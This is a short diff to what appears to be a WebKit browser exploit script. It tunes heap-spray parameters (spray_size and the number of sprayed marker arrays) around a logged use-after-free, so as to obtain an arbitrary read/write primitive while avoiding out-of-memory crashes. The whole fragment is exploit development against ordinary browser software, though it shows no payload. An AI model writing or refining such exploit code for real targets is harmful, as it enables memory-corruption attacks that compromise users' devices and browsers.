@@ -6,7 +6,7 @@ include('defs.js')
 
 // needed for arw
 const u32_structs: Uint32Array[] = new Array(0x100)
-const spray_size = 0x180  // Increased from 0x100 for better marker coverage
+const spray_size = 0x140  // Reverted from 0x180 to avoid WebKit OOM killer instant app exits
 let marked_arr_offset = -1
 let corrupted_arr_idx = -1
 const marker = new BigInt(0xFFFF0000, 0x13371337)
@@ -29,7 +29,7 @@ log('Achieved UAF !!')
 
 log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
-const spray = new Array(0x1400)  // Increased from 0x1000 (~25% more spray candidates)
+const spray = new Array(0x1200)  // Reverted to 0x1200 (~12% more instead of 25%) to balance OOM threshold
 for (let i = 0; i < spray.length; i++) {
   spray[i] = new Array(spray_size).fill(0x13371337)
 }
